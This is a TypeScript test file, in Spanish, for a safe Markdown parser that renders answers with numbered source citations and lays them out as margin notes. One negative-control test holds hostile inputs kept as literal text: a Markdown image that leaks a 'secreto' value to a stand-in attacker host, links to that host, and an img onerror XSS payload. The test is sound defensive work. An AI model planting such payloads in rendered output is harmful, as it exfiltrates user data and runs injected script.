import { Fragmento } from './api.types';
import { analizar, maquetar, soloCitas } from './markdown';

const cita = (numero: number): Fragmento => ({
  numero, documento: `doc-${numero}.md`, seccion: 's', url: 'https://x', puntuacion: 1, texto: 't',
});
const C1 = cita(1);
const C2 = cita(2);

describe('analizar (Markdown seguro)', () => {
  it('párrafos, negrita, código en línea y citas', () => {
    expect(analizar('Usa **git stash** con `-u` [1].\n\nOtro párrafo', [C1])).toEqual([
      { t: 'parrafo', partes: [
        { t: 'texto', v: 'Usa ' },
        { t: 'negrita', hijos: [{ t: 'texto', v: 'git stash' }] },
        { t: 'texto', v: ' con ' },
        { t: 'codigo', v: '-u' },
        { t: 'texto', v: ' ' },
        { t: 'cita', cita: C1 },
        { t: 'texto', v: '.' },
      ] },
      { t: 'parrafo', partes: [{ t: 'texto', v: 'Otro párrafo' }] },
    ]);
  });

  it('bloques de código: lo de dentro no se interpreta, y sin valla de cierre llega hasta el final', () => {
    expect(analizar('Ejemplo:\n```bash\n$ git branch **x** [1]\n```\nFin', [C1])).toEqual([
      { t: 'parrafo', partes: [{ t: 'texto', v: 'Ejemplo:' }] },
      { t: 'codigo', v: '$ git branch **x** [1]' },
      { t: 'parrafo', partes: [{ t: 'texto', v: 'Fin' }] },
    ]);
    expect(analizar('```\nsin cerrar', [])).toEqual([{ t: 'codigo', v: 'sin cerrar' }]);
  });

  it('listas con viñetas y numeradas', () => {
    const bloques = analizar('- uno\n- **dos**\n\n1. a\n2) b', []);
    expect(bloques.map((b) => b.t)).toEqual(['lista', 'lista']);
    expect(bloques[0]).toMatchObject({ ordenada: false, elementos: [[{ v: 'uno' }], [{ t: 'negrita' }]] });
    expect(bloques[1]).toMatchObject({ ordenada: true, inicio: 1, elementos: [[{ v: 'a' }], [{ v: 'b' }]] });
  });

  it('una lista numerada cortada sigue con su número, no vuelve a 1', () => {
    const bloques = analizar('1. Crea la rama\n\n2. Cámbiate\n```\ngit switch x\n```\n3. Haz commit', []);
    expect(bloques.filter((b) => b.t === 'lista').map((b) => (b as { inicio: number }).inicio)).toEqual([1, 2, 3]);
  });

  it('un ```x``` dentro de una frase no abre un bloque de código ni se traga las citas', () => {
    const bloques = analizar('```git stash``` guarda los cambios [1].\n\nDespués, git stash pop [1].', [C1]);
    expect(bloques.map((b) => b.t)).toEqual(['parrafo', 'parrafo']);
    expect(bloques.every((b) => b.t === 'parrafo' && b.partes.some((p) => p.t === 'cita'))).toBe(true);
  });

  it('los separadores (--- y * * *) no son viñetas', () => {
    expect(analizar('Uno\n---\nDos\n* * *\nTres', []).map((b) => b.t)).toEqual(['parrafo', 'parrafo', 'parrafo']);
  });

  it('solo es cita un [n] que ha mandado la API', () => {
    expect(analizar('Uno [1] y otro [7]', [C1])[0]).toEqual({ t: 'parrafo', partes: [
      { t: 'texto', v: 'Uno ' }, { t: 'cita', cita: C1 }, { t: 'texto', v: ' y otro [7]' },
    ] });
  });

  // Control negativo: lo que no está en el subconjunto se queda como texto literal.
  it('imágenes, enlaces, HTML y encabezados se quedan como texto', () => {
    const peligroso = [
      '![x](https://atacante.example/fuga?d=secreto)',
      '[pulsa aquí](https://atacante.example)',
      '<img src=x onerror=alert(1)> <a href="https://atacante.example">a</a>',
      '# Título',
    ];
    for (const texto of peligroso) {
      expect(analizar(texto, [C1])).toEqual([{ t: 'parrafo', partes: [{ t: 'texto', v: texto }] }]);
    }
    // Un [1] seguido de una URL sigue siendo solo una cita, y la URL, texto.
    expect(analizar('[1](https://atacante.example)', [C1])[0]).toEqual({ t: 'parrafo', partes: [
      { t: 'cita', cita: C1 }, { t: 'texto', v: '(https://atacante.example)' },
    ] });
  });
});

describe('maquetar (notas al margen)', () => {
  it('una cita que solo aparece dentro de código también tiene su nota (en la primera fila)', () => {
    const filas = maquetar(analizar('Ejecuta:\n```\nkubectl get rs  # [1]\n```', [C1]), [C1]);
    expect(filas[0].notas).toEqual([C1]);
  });

  it('cada cita se anota una vez, junto al primer bloque que la menciona', () => {
    const filas = maquetar(analizar('A [1]\n\nB [1] [2]\n\nC', [C1, C2]));
    expect(filas.map((f) => f.notas.map((n) => n.numero))).toEqual([[1], [2], []]);
    // Cada grupo de notas ocupa hasta el siguiente grupo (líneas de la rejilla, desde 1).
    expect(filas.map((f) => f.hasta)).toEqual([2, 4, 0]);
  });

  it('un [1] suelto al final se aplica a toda la respuesta: su nota sube a la primera fila', () => {
    const bloques = analizar('Texto\n\n```\ncódigo\n```\n\n[1]', [C1]);
    expect(soloCitas(bloques[2])).toBe(true);
    const filas = maquetar(bloques);
    expect(filas.map((f) => f.notas.length)).toEqual([1, 0, 0]);
    expect(filas[0].hasta).toBe(4);
  });
});
